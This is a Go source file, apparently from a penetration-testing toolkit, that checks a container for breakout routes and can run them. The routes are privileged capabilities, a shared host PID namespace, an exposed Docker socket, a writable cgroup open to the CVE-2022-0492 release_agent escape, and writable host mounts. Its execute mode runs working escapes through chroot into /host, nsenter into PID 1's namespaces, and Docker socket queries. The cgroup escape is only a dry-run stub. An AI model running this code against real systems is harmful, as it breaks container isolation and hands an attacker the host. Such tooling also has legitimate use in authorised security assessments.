package escape

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"strings"
)

type EscapeResult struct {
	Action     string          `json:"action"`
	InContainer bool           `json:"in_container"`
	Techniques []TechniqueInfo `json:"techniques,omitempty"`
	Executed   *ExecuteResult  `json:"executed,omitempty"`
}

type TechniqueInfo struct {
	Name      string `json:"name"`
	Available bool   `json:"available"`
	Detail    string `json:"detail"`
}

type ExecuteResult struct {
	Technique string `json:"technique"`
	Success   bool   `json:"success"`
	Output    string `json:"output,omitempty"`
	Error     string `json:"error,omitempty"`
}

func Execute(action, technique, output string) error {
	var result *EscapeResult

	switch action {
	case "detect":
		result = detect()
	case "execute":
		result = executeEscape(technique)
	default:
		return fmt.Errorf("unsupported action: %s (use detect or execute)", action)
	}

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func detect() *EscapeResult {
	result := &EscapeResult{
		Action:      "detect",
		InContainer: isInContainer(),
	}

	result.Techniques = append(result.Techniques, checkPrivileged())
	result.Techniques = append(result.Techniques, checkHostPID())
	result.Techniques = append(result.Techniques, checkHostNetwork())
	result.Techniques = append(result.Techniques, checkDockerSocket())
	result.Techniques = append(result.Techniques, checkCgroupEscape())
	result.Techniques = append(result.Techniques, checkWritableHostPath())

	return result
}

func isInContainer() bool {
	if _, err := os.Stat("/.dockerenv"); err == nil {
		return true
	}
	if _, err := os.Stat("/run/.containerenv"); err == nil {
		return true
	}
	data, err := os.ReadFile("/proc/1/cgroup")
	if err == nil {
		content := string(data)
		if strings.Contains(content, "docker") || strings.Contains(content, "kubepods") || strings.Contains(content, "containerd") {
			return true
		}
	}
	return false
}

func checkPrivileged() TechniqueInfo {
	info := TechniqueInfo{Name: "privileged_mode"}

	data, err := os.ReadFile("/proc/self/status")
	if err != nil {
		info.Detail = "cannot read /proc/self/status"
		return info
	}

	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "CapEff:") {
			cap := strings.TrimSpace(strings.TrimPrefix(line, "CapEff:"))
			if cap == "000001ffffffffff" || cap == "0000003fffffffff" {
				info.Available = true
				info.Detail = "full capabilities detected (CapEff: " + cap + ") — can nsenter to host"
				return info
			}
			info.Detail = "limited capabilities (CapEff: " + cap + ")"
			return info
		}
	}
	info.Detail = "CapEff not found in /proc/self/status"
	return info
}

func checkHostPID() TechniqueInfo {
	info := TechniqueInfo{Name: "host_pid_namespace"}

	data, err := os.ReadFile("/proc/1/cmdline")
	if err != nil {
		info.Detail = "cannot read /proc/1/cmdline"
		return info
	}

	cmdline := string(data)
	if strings.Contains(cmdline, "systemd") || strings.Contains(cmdline, "/sbin/init") {
		info.Available = true
		info.Detail = "PID 1 is host init — host PID namespace shared"
		return info
	}
	info.Detail = "PID 1 is container process"
	return info
}

func checkHostNetwork() TechniqueInfo {
	info := TechniqueInfo{Name: "host_network"}

	entries, err := os.ReadDir("/sys/class/net")
	if err != nil {
		info.Detail = "cannot read /sys/class/net"
		return info
	}

	hostIndicators := []string{"eth0", "ens", "enp", "wlan", "bond"}
	for _, entry := range entries {
		name := entry.Name()
		for _, indicator := range hostIndicators {
			if strings.HasPrefix(name, indicator) {
				info.Available = true
				info.Detail = "host network interface detected: " + name
				return info
			}
		}
	}
	info.Detail = "only container network interfaces found"
	return info
}

func checkDockerSocket() TechniqueInfo {
	info := TechniqueInfo{Name: "docker_socket"}

	paths := []string{"/var/run/docker.sock", "/run/docker.sock"}
	for _, p := range paths {
		if fi, err := os.Stat(p); err == nil {
			info.Available = true
			info.Detail = fmt.Sprintf("Docker socket found at %s (mode: %s)", p, fi.Mode())
			return info
		}
	}
	info.Detail = "no Docker socket found"
	return info
}

func checkCgroupEscape() TechniqueInfo {
	info := TechniqueInfo{Name: "cgroup_escape"}

	data, err := os.ReadFile("/proc/self/mountinfo")
	if err != nil {
		info.Detail = "cannot read /proc/self/mountinfo"
		return info
	}

	if strings.Contains(string(data), "cgroup") {
		rdmaPath := "/sys/fs/cgroup/rdma"
		if fi, err := os.Stat(rdmaPath); err == nil && fi.IsDir() {
			if _, err := os.ReadDir(rdmaPath); err == nil {
				info.Available = true
				info.Detail = "writable cgroup found — release_agent escape possible (CVE-2022-0492)"
				return info
			}
		}
	}
	info.Detail = "cgroup escape not feasible"
	return info
}

func checkWritableHostPath() TechniqueInfo {
	info := TechniqueInfo{Name: "writable_host_path"}

	data, err := os.ReadFile("/proc/mounts")
	if err != nil {
		info.Detail = "cannot read /proc/mounts"
		return info
	}

	hostPaths := []string{"/host", "/rootfs", "/mnt/host"}
	for _, line := range strings.Split(string(data), "\n") {
		for _, hp := range hostPaths {
			if strings.Contains(line, hp) && !strings.Contains(line, "ro,") {
				info.Available = true
				info.Detail = "writable host mount detected: " + hp
				return info
			}
		}
	}
	info.Detail = "no writable host path mounts found"
	return info
}

func executeEscape(technique string) *EscapeResult {
	result := &EscapeResult{
		Action:      "execute",
		InContainer: isInContainer(),
	}

	if technique == "auto" {
		technique = selectBestTechnique()
	}

	switch technique {
	case "privileged":
		result.Executed = escapePrivileged()
	case "socket":
		result.Executed = escapeDockerSocket()
	case "cgroup":
		result.Executed = escapeCgroup()
	case "nsenter":
		result.Executed = escapeNsenter()
	default:
		result.Executed = &ExecuteResult{
			Technique: technique,
			Success:   false,
			Error:     fmt.Sprintf("unknown technique: %s", technique),
		}
	}

	return result
}

func selectBestTechnique() string {
	if t := checkPrivileged(); t.Available {
		return "nsenter"
	}
	if t := checkDockerSocket(); t.Available {
		return "socket"
	}
	if t := checkCgroupEscape(); t.Available {
		return "cgroup"
	}
	return "privileged"
}

func escapePrivileged() *ExecuteResult {
	r := &ExecuteResult{Technique: "privileged"}
	if t := checkPrivileged(); !t.Available {
		r.Error = "container is not privileged"
		return r
	}
	out, err := exec.Command("chroot", "/host", "id").CombinedOutput()
	if err != nil {
		r.Error = fmt.Sprintf("chroot failed: %v", err)
		return r
	}
	r.Success = true
	r.Output = strings.TrimSpace(string(out))
	return r
}

func escapeNsenter() *ExecuteResult {
	r := &ExecuteResult{Technique: "nsenter"}
	out, err := exec.Command("nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "id").CombinedOutput()
	if err != nil {
		r.Error = fmt.Sprintf("nsenter failed: %v", err)
		return r
	}
	r.Success = true
	r.Output = strings.TrimSpace(string(out))
	return r
}

func escapeDockerSocket() *ExecuteResult {
	r := &ExecuteResult{Technique: "docker_socket"}
	if t := checkDockerSocket(); !t.Available {
		r.Error = "Docker socket not available"
		return r
	}

	out, err := exec.Command("curl", "-s", "--unix-socket", "/var/run/docker.sock", "http://localhost/info").CombinedOutput()
	if err != nil {
		r.Error = fmt.Sprintf("docker socket query failed: %v", err)
		return r
	}
	r.Success = true
	r.Output = strings.TrimSpace(string(out))
	return r
}

func escapeCgroup() *ExecuteResult {
	r := &ExecuteResult{Technique: "cgroup_escape"}
	if t := checkCgroupEscape(); !t.Available {
		r.Error = "cgroup escape not feasible"
		return r
	}
	r.Success = false
	r.Output = "cgroup escape detected as feasible — payload not deployed (dry-run)"
	return r
}
